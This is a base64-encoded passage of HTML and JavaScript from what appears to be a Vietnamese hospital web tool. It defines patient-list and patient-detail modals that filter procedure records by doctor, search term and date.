VTaXplKGUudGFyZ2V0LnZhbHVlKSk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPCEtLURhbmggc8OhY2ggdGjhu6cgdGh14bqtdCB04burbmcgYuG7h25oIG5ow6JuLS0+DQo8IS0tIE1vZGFsIERhbmggc8OhY2ggYuG7h25oIG5ow6JuIC0tPg0KPGRpdiBpZD0icGF0aWVudExpc3RNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwODA7Ij4NCiAgPGRpdiBzdHlsZT0icG9zaXRpb246YWJzb2x1dGU7aW5zZXQ6MDtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC41KSIgb25jbGljaz0iY2xvc2VQYXRpZW50TGlzdCgpIj48L2Rpdj4NCiAgPGRpdiBjbGFzcz0ibW9kYWwtYmFzZSBtb2RhbC1sYXJnZSI+DQogICAgPGRpdiBzdHlsZT0iZGlzcGxheTpmbGV4O2FsaWduLWl0ZW1zOmNlbnRlcjtqdXN0aWZ5LWNvbnRlbnQ6c3BhY2UtYmV0d2VlbjtwYWRkaW5nOjE0cHggMTZweDtib3JkZXItYm90dG9tOjFweCBzb2xpZCAjZTVlN2ViIj4NCiAgICAgIDxoMyBzdHlsZT0ibWFyZ2luOjA7Zm9udC1zaXplOjE4cHgiPkRhbmggc8OhY2ggYuG7h25oIG5ow6JuPC9oMz4NCiAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgb25jbGljaz0iY2xvc2VQYXRpZW50TGlzdCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgICA8L2Rpdj4NCiAgICANCiAgICA8IS0tIELhu5kgbOG7jWMgLS0+DQogICAgPGRpdiBjbGFzcz0iZmlsdGVyLWNvbnRhaW5lciIgc3R5bGU9InBhZGRpbmc6MTZweCAxNnB4IDAgMTZweDsiPg0KICAgICAgPGRpdj4NCiAgICAgICAgPGxhYmVsIGZvcj0icGF0aWVudERvY3RvckZpbHRlciI+QsOhYyBzxKkgY2jhu4kgxJHhu4tuaDo8L2xhYmVsPg0KICAgICAgICA8c2VsZWN0IGlkPSJwYXRpZW50RG9jdG9yRmlsdGVyIiBjbGFzcz0ibG9naW4taW5wdXQiIHN0eWxlPSJ3aWR0aDphdXRvO21hcmdpbi1sZWZ0OjEwcHg7Ij4NCiAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4NCiAgICAgICAgPC9zZWxlY3Q+DQogICAgICA8L2Rpdj4NCiAgICAgIDxkaXY+DQogICAgICAgIDxsYWJlbCBmb3I9InBhdGllbnRTZWFyY2giPlTDrG0ga2nhur9tOjwvbGFiZWw+DQogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0icGF0aWVudFNlYXJjaCIgcGxhY2Vob2xkZXI9IlTDqm4gQk4sIG3DoyBCTiwgbcOjIMSRaeG7gXUgdHLhu4siIA0KICAgICAgICAgICAgICAgc3R5bGU9IndpZHRoOjI1MHB4O21hcmdpbi1sZWZ0OjEwcHg7Ij4NCiAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIA0KICAgIDwhLS0gQuG6o25nIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuIC0tPg0KICAgIDxkaXYgc3R5bGU9InBhZGRpbmc6MCAxNnB4IDE2cHggMTZweDsiPg0KICAgICAgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSIgc3R5bGU9IndpZHRoOjEwMCUiPg0KICAgICAgICA8dGhlYWQ+DQogICAgICAgICAgPHRyPg0KICAgICAgICAgICAgPHRoPk3DoyBCTjwvdGg+DQogICAgICAgICAgICA8dGg+VMOqbiBi4buHbmggbmjDom48L3RoPg0KICAgICAgICAgICAgPHRoPlR14buVaTwvdGg+DQogICAgICAgICAgICA8dGg+QsOhYyBzxKkgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5IGlkPSJwYXRpZW50TGlzdEJvZHkiPjwvdGJvZHk+DQogICAgICA8L3RhYmxlPg0KICAgIDwvZGl2Pg0KICA8L2Rpdj4NCjwvZGl2Pg0KDQo8IS0tIE1vZGFsIENoaSB0aeG6v3QgYuG7h25oIG5ow6JuIC0tPg0KPGRpdiBpZD0icGF0aWVudERldGFpbE1vZGFsIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO2luc2V0OjA7ei1pbmRleDoxMTA5MDsiPg0KICA8ZGl2IHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIiBvbmNsaWNrPSJjbG9zZVBhdGllbnREZXRhaWwoKSI+PC9kaXY+DQogIDxkaXYgY2xhc3M9Im1vZGFsLWJhc2UgbW9kYWwtbGFyZ2UiPg0KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzoxNHB4IDE2cHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogICAgICA8aDMgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxOHB4IiBpZD0icGF0aWVudERldGFpbFRpdGxlIj5DaGkgdGnhur90IGLhu4duaCBuaMOibjwvaDM+DQogICAgICA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImNsb3NlUGF0aWVudERldGFpbCgpIj7EkMOzbmc8L2J1dHRvbj4NCiAgICA8L2Rpdj4NCiAgICANCiAgICA8IS0tIELhu5kgbOG7jWMgbmfDoHkgLS0+DQogICAgPGRpdiBjbGFzcz0iZmlsdGVyLWNvbnRhaW5lciIgc3R5bGU9InBhZGRpbmc6MTZweCAxNnB4IDAgMTZweDsiPg0KICAgICAgPGRpdj4NCiAgICAgICAgPGxhYmVsIGZvcj0icGF0aWVudERhdGVGaWx0ZXIiPkzhu41jIHRoZW8gbmfDoHk6PC9sYWJlbD4NCiAgICAgICAgPHNlbGVjdCBpZD0icGF0aWVudERhdGVGaWx0ZXIiIGNsYXNzPSJsb2dpbi1pbnB1dCIgc3R5bGU9IndpZHRoOmF1dG87bWFyZ2luLWxlZnQ6MTBweDsiPg0KICAgICAgICAgIDxvcHRpb24gdmFsdWU9ImFsbCI+VOG6pXQgY+G6oyBuZ8OgeTwvb3B0aW9uPg0KICAgICAgICA8L3NlbGVjdD4NCiAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIA0KICAgIDwhLS0gQuG6o25nIGNoaSB0aeG6v3QgdGjhu6cgdGh14bqtdCAtLT4NCiAgICA8ZGl2IHN0eWxlPSJwYWRkaW5nOjAgMTZweCAxNnB4IDE2cHg7Ij4NCiAgICAgIDx0YWJsZSBjbGFzcz0iZXJyb3ItdGFibGUiIHN0eWxlPSJ3aWR0aDoxMDAlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgIDx0aD5UaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aD48Y2VudGVyPlRo4budaSBnaWFuPC9jZW50ZXI+PC90aD4NCiAgICAgICAgICAgIDx0aCBjbGFzcz0iZG9jdG9yLWNvbHVtbiI+QsOhYyBzxKkgY2jhu4kgxJHhu4tuaDwvdGg+DQogICAgICAgICAgICA8dGg+TmfGsOG7nWkgdGjhu7FjIGhp4buHbjwvdGg+DQogICAgICAgICAgPC90cj4NCiAgICAgICAgPC90aGVhZD4NCiAgICAgICAgPHRib2R5IGlkPSJwYXRpZW50RGV0YWlsQm9keSI+PC90Ym9keT4NCiAgICAgIDwvdGFibGU+DQogICAgPC9kaXY+DQogIDwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KLy8gQmnhur9uIGzGsHUgdHLhu68gZOG7ryBsaeG7h3UgYuG7h25oIG5ow6JuDQpsZXQgcGF0aWVudExpc3REYXRhID0gW107DQoNCi8vIE3hu58gbW9kYWwgZGFuaCBzw6FjaCBi4buHbmggbmjDom4NCmZ1bmN0aW9uIG9wZW5QYXRpZW50TGlzdCgpIHsNCiAgICBpZiAoIWFsbFByb2NlZHVyZXMgfHwgYWxsUHJvY2VkdXJlcy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgYWxlcnQoJ1Z1aSBsw7JuZyBraeG7g20gdHJhIGZpbGUgdHLGsOG7m2Mga2hpIHhlbSBkYW5oIHPDoWNoIGLhu4duaCBuaMOibi4nKTsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICAvLyBY4butIGzDvSBk4buvIGxp4buHdSBi4buHbmggbmjDom4NCiAgICBwcm9jZXNzUGF0aWVudERhdGEoKTsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sgbW9kYWwNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudExpc3RNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KfQ0KDQovLyDEkMOzbmcgbW9kYWwgZGFuaCBzw6FjaCBi4buHbmggbmjDom4NCmZ1bmN0aW9uIGNsb3NlUGF0aWVudExpc3QoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRMaXN0TW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KfQ0KDQovLyBY4butIGzDvSBk4buvIGxp4buHdSBi4buHbmggbmjDom4NCmZ1bmN0aW9uIHByb2Nlc3NQYXRpZW50RGF0YSgpIHsNCiAgICBjb25zdCBwYXRpZW50TWFwID0gbmV3IE1hcCgpOw0KICAgIA0KICAgIC8vIEdvbSBuaMOzbSBk4buvIGxp4buHdSB0aGVvIGLhu4duaCBuaMOibiAoa2jDtG5nIHBow6JuIGJp4buHdCDEkeG7o3QgxJFp4buBdSB0cuG7iykNCiAgICBhbGxQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IHBhdGllbnRJZCA9IHByb2MucGF0aWVudElkIHx8ICdLaMO0bmcgY8OzJzsNCiAgICAgICAgY29uc3QgcGF0aWVudE5hbWUgPSBwcm9jLnBhdGllbnROYW1lIHx8ICdLaMO0bmcgY8OzJzsNCiAgICAgICAgY29uc3QgcGF0aWVudEFnZSA9IHByb2MucGF0aWVudEFnZSB8fCAnS2jDtG5nIGPDsyc7DQogICAgICAgIGNvbnN0IGRvY3RvciA9IHByb2MuZG9jdG9yIHx8ICdLaMO0bmcgY8OzJzsNCiAgICAgICAgDQogICAgICAgIC8vIFThuqFvIGtleSBkdXkgbmjhuqV0IGNobyBi4buHbmggbmjDom4gKGNo4buJIGTDuW5nIG3DoyBCTiB2w6AgdMOqbikNCiAgICAgICAgY29uc3QgcGF0aWVudEtleSA9IGAke3BhdGllbnRJZH1fJHtwYXRpZW50TmFtZX1gOw0KICAgICAgICANCiAgICAgICAgaWYgKCFwYXRpZW50TWFwLmhhcyhwYXRpZW50S2V5KSkgew0KICAgICAgICAgICAgcGF0aWVudE1hcC5zZXQocGF0aWVudEtleSwgew0KICAgICAgICAgICAgICAgIHBhdGllbnRJZCwNCiAgICAgICAgICAgICAgICBwYXRpZW50TmFtZSwNCiAgICAgICAgICAgICAgICBwYXRpZW50QWdlLA0KICAgICAgICAgICAgICAgIGRvY3RvciwNCiAgICAgICAgICAgICAgICBwcm9jZWR1cmVzOiBbcHJvY10gLy8gTMawdSB04bqldCBj4bqjIHRo4bunIHRodeG6rXQgY+G7p2EgYuG7h25oIG5ow6JuDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIC8vIFRow6ptIHRo4bunIHRodeG6rXQgdsOgbyBi4buHbmggbmjDom4gxJHDoyB04buTbiB04bqhaQ0KICAgICAgICAgICAgY29uc3QgcGF0aWVudCA9IHBhdGllbnRNYXAuZ2V0KHBhdGllbnRLZXkpOw0KICAgICAgICAgICAgcGF0aWVudC5wcm9jZWR1cmVzLnB1c2gocHJvYyk7DQogICAgICAgIH0NCiAgICB9KTsNCiAgICANCiAgICAvLyBDaHV54buDbiBNYXAgdGjDoG5oIG3huqNuZw0KICAgIHBhdGllbnRMaXN0RGF0YSA9IEFycmF5LmZyb20ocGF0aWVudE1hcC52YWx1ZXMoKSk7DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLIGRhbmggc8OhY2gNCiAgICByZW5kZXJQYXRpZW50TGlzdCgpOw0KICAgIA0KICAgIC8vIEPhuq1wIG5o4bqtdCBi4buZIGzhu41jIGLDoWMgc8SpDQogICAgdXBkYXRlUGF0aWVudERvY3RvckZpbHRlcigpOw0KfQ0KDQovLyBIaeG7g24gdGjhu4sgZGFuaCBzw6FjaCBi4buHbmggbmjDom4NCmZ1bmN0aW9uIHJlbmRlclBhdGllbnRMaXN0KCkgew0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnRMaXN0Qm9keScpOw0KICAgIGNvbnN0IGRvY3RvckZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RG9jdG9yRmlsdGVyJykudmFsdWU7DQogICAgY29uc3Qgc2VhcmNoVGVybSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50U2VhcmNoJykudmFsdWUudG9Mb3dlckNhc2UoKTsNCiAgICANCiAgICAvLyBM4buNYyBk4buvIGxp4buHdQ0KICAgIGxldCBmaWx0ZXJlZERhdGEgPSBwYXRpZW50TGlzdERhdGE7DQogICAgDQogICAgaWYgKGRvY3RvckZpbHRlciAhPT0gJ2FsbCcpIHsNCiAgICAgICAgZmlsdGVyZWREYXRhID0gZmlsdGVyZWREYXRhLmZpbHRlcihwID0+IHAuZG9jdG9yID09PSBkb2N0b3JGaWx0ZXIpOw0KICAgIH0NCiAgICANCiAgICBpZiAoc2VhcmNoVGVybSkgew0KICAgICAgICBmaWx0ZXJlZERhdGEgPSBmaWx0ZXJlZERhdGEuZmlsdGVyKHAgPT4gDQogICAgICAgICAgICBwLnBhdGllbnROYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoc2VhcmNoVGVybSkgfHwNCiAgICAgICAgICAgIHAucGF0aWVudElkLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoc2VhcmNoVGVybSkNCiAgICAgICAgKTsNCiAgICB9DQogICAgDQogICAgLy8gSGnhu4NuIHRo4buLDQogICAgdGJvZHkuaW5uZXJIVE1MID0gJyc7DQogICAgDQogICAgaWYgKGZpbHRlcmVkRGF0YS5sZW5ndGggPT09IDApIHsNCiAgICAgICAgdGJvZHkuaW5uZXJIVE1MID0gJzx0cj48dGQgY29sc3Bhbj0iNCIgc3R5bGU9InRleHQtYWxpZ246Y2VudGVyIj5LaMO0bmcgdMOsbSB0aOG6pXkgYuG7h25oIG5ow6JuIG7DoG88L3RkPjwvdHI+JzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCiAgICANCiAgICBmaWx0ZXJlZERhdGEuZm9yRWFjaChwYXRpZW50ID0+IHsNCiAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgcm93LmNsYXNzTmFtZSA9ICdwYXRpZW50LXJvdyc7DQogICAgICAgIHJvdy5vbmNsaWNrID0gKCkgPT4gb3BlblBhdGllbnREZXRhaWwocGF0aWVudCk7DQogICAgICAgIHJvdy5pbm5lckhUTUwgPSBgDQogICAgICAgICAgICA8dGQ+JHtwYXRpZW50LnBhdGllbnRJZH08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cGF0aWVudC5wYXRpZW50TmFtZX08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cGF0aWVudC5wYXRpZW50QWdlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+JHtwYXRpZW50LmRvY3Rvcn08L3RkPg0KICAgICAgICBgOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0pOw0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgYuG7mSBs4buNYyBiw6FjIHPEqQ0KZnVuY3Rpb24gdXBkYXRlUGF0aWVudERvY3RvckZpbHRlcigpIHsNCiAgICBjb25zdCBkb2N0b3JzID0gWy4uLm5ldyBTZXQocGF0aWVudExpc3REYXRhLm1hcChwID0+IHAuZG9jdG9yKSldLnNvcnQoKTsNCiAgICBjb25zdCBzZWxlY3QgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERvY3RvckZpbHRlcicpOw0KICAgIA0KICAgIHNlbGVjdC5pbm5lckhUTUwgPSAnPG9wdGlvbiB2YWx1ZT0iYWxsIj5U4bqldCBj4bqjPC9vcHRpb24+JyArDQogICAgICAgIGRvY3RvcnMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCn0NCg0KLy8gQmnhur9uIGzGsHUgdHLhu68gYuG7h25oIG5ow6JuIMSRYW5nIMSRxrDhu6NjIHhlbQ0KbGV0IGN1cnJlbnRQYXRpZW50ID0gbnVsbDsNCg0KLy8gTeG7nyBtb2RhbCBjaGkgdGnhur90IGLhu4duaCBuaMOibg0KZnVuY3Rpb24gb3BlblBhdGllbnREZXRhaWwocGF0aWVudCkgew0KICAgIGN1cnJlbnRQYXRpZW50ID0gcGF0aWVudDsNCiAgICANCiAgICAvLyDEkOG6t3QgdGnDqnUgxJHhu4ENCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERldGFpbFRpdGxlJykudGV4dENvbnRlbnQgPSANCiAgICAgICAgYENoaSB0aeG6v3QgYuG7h25oIG5ow6JuOiAke3BhdGllbnQucGF0aWVudE5hbWV9ICgke3BhdGllbnQucGF0aWVudElkfSlgOw0KICAgIA0KICAgIC8vIEPhuq1wIG5o4bqtdCBi4buZIGzhu41jIG5nw6B5DQogICAgdXBkYXRlUGF0aWVudERhdGVGaWx0ZXIocGF0aWVudC5wcm9jZWR1cmVzKTsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sgY2hpIHRp4bq/dCAodOG6pXQgY+G6oyB0aOG7pyB0aHXhuq10IGJhbiDEkeG6p3UpDQogICAgcmVuZGVyUGF0aWVudERldGFpbChwYXRpZW50LnByb2NlZHVyZXMpOw0KICAgIA0KICAgIC8vIEhp4buDbiB0aOG7iyBtb2RhbA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGV0YWlsTW9kYWwnKS5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCn0NCg0KLy8gxJDDs25nIG1vZGFsIGNoaSB0aeG6v3QgYuG7h25oIG5ow6JuDQpmdW5jdGlvbiBjbG9zZVBhdGllbnREZXRhaWwoKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREZXRhaWxNb2RhbCcpLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7DQogICAgY3VycmVudFBhdGllbnQgPSBudWxsOw0KfQ0KDQovLyBD4bqtcCBuaOG6rXQgYuG7mSBs4buNYyBuZ8OgeSBjaG8gY2hpIHRp4bq/dCBi4buHbmggbmjDom4NCmZ1bmN0aW9uIHVwZGF0ZVBhdGllbnREYXRlRmlsdGVyKHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBkYXRlcyA9IFsuLi5uZXcgU2V0KHByb2NlZHVyZXMubWFwKHAgPT4gcC5kYXRlKSldLnNvcnQoKGEsIGIpID0+IHsNCiAgICAgICAgY29uc3QgW2RhLCBtYSwgeWFdID0gYS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICBjb25zdCBbZGIsIG1iLCB5Yl0gPSBiLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgIHJldHVybiBuZXcgRGF0ZSh5YSwgbWEgLSAxLCBkYSkgLSBuZXcgRGF0ZSh5YiwgbWIgLSAxLCBkYik7DQogICAgfSk7DQogICAgDQogICAgY29uc3Qgc2VsZWN0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREYXRlRmlsdGVyJyk7DQogICAgc2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqMgbmfDoHk8L29wdGlvbj4nICsNCiAgICAgICAgZGF0ZXMubWFwKGQgPT4gYDxvcHRpb24gdmFsdWU9IiR7ZH0iPiR7ZH08L29wdGlvbj5gKS5qb2luKCcnKTsNCn0NCg0KLy8gSGnhu4NuIHRo4buLIGNoaSB0aeG6v3QgdGjhu6cgdGh14bqtdCBj4bunYSBi4buHbmggbmjDom4NCmZ1bmN0aW9uIHJlbmRlclBhdGllbnREZXRhaWwocHJvY2VkdXJlcykgew0KICAgIGNvbnN0IHRib2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BhdGllbnREZXRhaWxCb2R5Jyk7DQogICAgY29uc3QgZGF0ZUZpbHRlciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGF0ZUZpbHRlcicpLnZhbHVlOw0KICAgIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICANCiAgICAvLyBM4buNYyB0aGVvIG5nw6B5DQogICAgbGV0IGZpbHRlcmVkUHJvY2VkdXJlcyA9IHByb2NlZHVyZXM7DQogICAgaWYgKGRhdGVGaWx0ZXIgIT09ICdhbGwnKSB7DQogICAgICAgIGZpbHRlcmVkUHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5kYXRlID09PSBkYXRlRmlsdGVyKTsNCiAgICB9DQogICAgDQogICAgLy8gU+G6r3AgeOG6v3AgdGhlbyBuZ8OgeSB2w6AgdGjhu51pIGdpYW4NCiAgICBmaWx0ZXJlZFByb2NlZHVyZXMuc29ydCgoYSwgYikgPT4gew0KICAgICAgICBpZiAoYS5kYXRlICE9PSBiLmRhdGUpIHsNCiAgICAgICAgICAgIGNvbnN0IFtkYSwgbWEsIHlhXSA9IGEuZGF0ZS5zcGxpdCgnLycpLm1hcChOdW1iZXIpOw0KICAgICAgICAgICAgY29uc3QgW2RiLCBtYiwgeWJdID0gYi5kYXRlLnNwbGl0KCcvJykubWFwKE51bWJlcik7DQogICAgICAgICAgICByZXR1cm4gbmV3IERhdGUoeWEsIG1hIC0gMSwgZGEpIC0gbmV3IERhdGUoeWIsIG1iIC0gMSwgZGIpOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiBhLnN0YXJ0IC0gYi5zdGFydDsNCiAgICB9KTsNCiAgICANCiAgICAvLyBIaeG7g24gdGjhu4sNCiAgICB0Ym9keS5pbm5lckhUTUwgPSAnJzsNCiAgICANCiAgICBpZiAoZmlsdGVyZWRQcm9jZWR1cmVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICB0Ym9keS5pbm5lckhUTUwgPSAnPHRyPjx0ZCBjb2xzcGFuPSI2IiBzdHlsZT0idGV4dC1hbGlnbjpjZW50ZXIiPktow7RuZyBjw7MgdGjhu6cgdGh14bqtdCBuw6BvPC90ZD48L3RyPic7DQogICAgICAgIHJldHVybjsNCiAgICB9DQogICAgDQogICAgZmlsdGVyZWRQcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGNvbnN0IHJvdyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgIHJvdy5jbGFzc05hbWUgPSAncGF0aWVudC1kZXRhaWwtcm93JzsNCiAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgIDx0ZD4ke3Byb2MucHJvY2VkdXJlfTwvdGQ+DQogICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke3Byb2MuZGF0ZX08YnIvPiR7cHJvYy5kaXNwbGF5U3RhcnR9IC0+ICR7cHJvYy5kaXNwbGF5RW5kfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iIHN0eWxlPSIke3Nob3dEb2N0b3IgPyAnJyA6ICdkaXNwbGF5Om5vbmUnfSI+JHtwcm9jLmRvY3Rvcn08L3RkPg0KICAgICAgICAgICAgPHRkPiR7cHJvYy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKX08L3RkPg0KICAgICAgICBgOw0KICAgICAgICB0Ym9keS5hcHBlbmRDaGlsZChyb3cpOw0KICAgIH0pOw0KfQ0KDQovLyBUaMOqbSBz4buxIGtp4buHbiBjaG8gY8OhYyBi4buZIGzhu41jDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdET01Db250ZW50TG9hZGVkJywgZnVuY3Rpb24oKSB7DQogICAgLy8gQuG7mSBs4buNYyB0cm9uZyBkYW5oIHPDoWNoIGLhu4duaCBuaMOibg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RG9jdG9yRmlsdGVyJykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgcmVuZGVyUGF0aWVudExpc3QpOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50U2VhcmNoJykuYWRkRXZlbnRMaXN0ZW5lcignaW5wdXQnLCByZW5kZXJQYXRpZW50TGlzdCk7DQogICAgDQogICAgLy8gQuG7mSBs4buNYyB0cm9uZyBjaGkgdGnhur90IGLhu4duaCBuaMOibg0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50RGF0ZUZpbHRlcicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICBpZiAoY3VycmVudFBhdGllbnQgJiYgY3VycmVudFBhdGllbnQucHJvY2VkdXJlcykgew0KICAgICAgICAgICAgcmVuZGVyUGF0aWVudERldGFpbChjdXJyZW50UGF0aWVudC5wcm9jZWR1cmVzKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KICAgIA0KICAgIC8vIEPhuq1wIG5o4bqtdCBoaeG7g24gdGjhu4sgY+G7mXQgYsOhYyBzxKkga2hpIGNoZWNrYm94IHRoYXkgxJHhu5VpDQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dEb2N0b3JDaGVja2JveCcpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uKCkgew0KICAgICAgICBjb25zdCBzaG93RG9jdG9yID0gdGhpcy5jaGVja2VkOw0KICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCcjcGF0aWVudERldGFpbEJvZHkgLmRvY3Rvci1jb2x1bW4nKS5mb3JFYWNoKHRkID0+IHsNCiAgICAgICAgICAgIHRkLnN0eWxlLmRpc3BsYXkgPSBzaG93RG9jdG9yID8gJycgOiAnbm9uZSc7DQogICAgICAgIH0pOw0KICAgICAgICANCiAgICAgICAgLy8gQ8WpbmcgY+G6rXAgbmjhuq10IHRyb25nIGRhbmggc8OhY2ggYuG7h25oIG5ow6JuIG7hur91IG1vZGFsIMSRYW5nIG3hu58NCiAgICAgICAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50TGlzdE1vZGFsJykuc3R5bGUuZGlzcGxheSA9PT0gJ2Jsb2NrJykgew0KICAgICAgICAgICAgcmVuZGVyUGF0aWVudExpc3QoKTsNCiAgICAgICAgfQ0KICAgIH0pOw0KfSk7DQoNCi8vIMSQw7NuZyBtb2RhbCBi4bqxbmcgRVNDDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCdrZXlkb3duJywgZnVuY3Rpb24oZSkgew0KICAgIGlmIChlLmtleSA9PT0gJ0VzY2FwZScpIHsNCiAgICAgICAgaWYgKGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXRpZW50TGlzdE1vZGFsJykuc3R5bGUuZGlzcGxheSA9PT0gJ2Jsb2NrJykgew0KICAgICAgICAgICAgY2xvc2VQYXRpZW50TGlzdCgpOw0KICAgICAgICB9DQogICAgICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncGF0aWVudERldGFpbE1vZGFsJykuc3R5bGUuZGlzcGxheSA9PT0gJ2Jsb2NrJykgew0KICAgICAgICAgICAgY2xvc2VQYXRpZW50RGV0YWlsKCk7DQogICAgICAgIH0NCiAgICB9DQp9KTs8L3NjcmlwdD4NCg0KDQo8IS0tIFBPUFVQIFRV4buyIEJJ4bq+TiBUSOG7piBUSFXhuqxUIC0tPg0KPGRpdiBpZD0iY3VzdG9taXplTW9kYWwiIHN0eWxlPSJkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7aW5zZXQ6MDt6LWluZGV4OjExMDYwOyI+DQogIDxkaXYgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO2luc2V0OjA7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLDAuNSkiIG9uY2xpY2s9ImNsb3NlQ3VzdG9taXplUGFuZWwoKSI+PC9kaXY+DQogIDxkaXYgY2xhc3M9Im1vZGFsLW